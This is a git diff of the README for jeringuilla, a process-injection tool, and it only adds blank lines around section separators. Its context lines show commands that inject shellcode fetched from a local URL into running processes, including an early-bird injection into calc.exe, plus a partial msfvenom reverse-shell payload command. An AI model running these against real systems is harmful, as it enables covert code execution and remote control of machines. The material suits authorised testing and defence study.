@@ -24,7 +24,9 @@ jeringuilla is a tool for easy process injection. It implements several types of
 Link: [https://github.com/ricardojoserf/jeringuilla](https://github.com/ricardojoserf/jeringuilla)
 
 <br>
+
 --------------------------------------
+
 <br>
 
 ## List process
@@ -50,7 +52,9 @@ jeringuilla.exe list "DESKTOP-MA54241\ricardo"
 ![img1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/jeringa/Screenshot_1.png)
 
 <br>
+
 --------------------------------------
+
 <br>
 
 
@@ -78,7 +82,9 @@ jeringuilla.exe inject-crt 9408 http://127.0.0.1/payload.bin
 ![img3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/jeringa/Screenshot_3.png)
 
 <br>
+
 --------------------------------------
+
 <br>
 
 
@@ -106,7 +112,9 @@ jeringuilla.exe inject-apc 1234 http://127.0.0.1/payload.bin
 ```
 
 <br>
+
 --------------------------------------
+
 <br>
 
 
@@ -133,7 +141,9 @@ jeringuilla.exe earlybird "c:\windows\system32\calc.exe" http://127.0.0.1/payloa
 ```
 
 <br>
+
 --------------------------------------
+
 <br>
 
 
@@ -154,7 +164,9 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=th
 ```
 
 <br>
+
 --------------------------------------
+
 <br>
 
 
